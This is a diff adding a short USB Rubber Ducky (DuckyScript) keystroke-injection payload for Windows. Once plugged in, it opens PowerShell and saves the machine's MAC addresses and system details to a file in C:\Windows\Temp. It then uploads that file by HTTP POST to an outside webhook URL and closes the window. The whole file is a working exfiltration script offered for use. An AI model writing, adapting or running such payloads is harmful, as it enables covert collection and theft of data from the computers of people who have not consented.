@@ -1,0 +1,21 @@
+DUCKY_LANG CS
+DELAY 600
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 500
+STRING cd C:\Windows\Temp
+ENTER
+DELAY 500
+STRING Get-WmiObject win32_networkadapterconfiguration | select description, macaddress > MacAddr.txt
+ENTER
+DELAY 1000
+STRING Get-CimInstance -ClassName Win32_ComputerSystem >> MacAddr.txt
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -UseBasicParsing -Method Post -Uri "https://events.hookdeck.com/e/src_bPHTBxMkx5SV" -InFile C:\Windows\Temp\MacAddr.txt
+ENTER
+DELAY 100
+STRING exit
+ENTER
